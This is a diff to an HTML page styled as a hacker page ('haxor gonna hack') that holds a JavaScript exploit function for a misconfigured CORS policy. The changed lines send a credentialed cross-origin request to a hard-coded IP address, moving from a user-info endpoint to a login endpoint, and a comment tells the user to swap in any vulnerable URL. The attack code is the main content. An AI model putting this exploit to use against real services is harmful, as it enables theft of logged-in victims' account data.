@@ -35,7 +35,7 @@ color="red" face="comic sans ms"size="1"><b>
 <font color=#ff9933>
 ################################################</font><font color=white>################################################</font><font color=green>################################################</font><br>
 </table>
-</table> <div align=center><font size=4 color=white face="comic sans ms"><img src="https://www.technopat.net/sosyal/styles/default/xenforo/smilies/matrix.gif"> --==[[ haxor gonna hack ]]==-- <img src="https://web.archive.org/web/20140704135452/freesmileys.org/smileys/smiley-flag010.gif"></font>
+</table> <div align=center><font size=4 color=white face="comic sans ms"><img src="https://www.technopat.net/sosyal/styles/default/xenforo/smilies/matrix.gif"> --==[[ haxor gonna hack ]]==-- 
 <font color=white size=4 face="comic sans ms">        
 <br># - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - # 
 <br>
@@ -50,9 +50,10 @@ function exploit() {
      
       }
  };
- xhttp.open("GET", "http://139.224.42.111/api/user/passport/auth/getUserInfo", true); //change the URL to the one which has mis-configured CORS policy
- xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
- xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+ xhttp.open("POST", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
+ xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
+ xhttp.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
+
  xhttp.withCredentials = true;
  xhttp.send();
 }
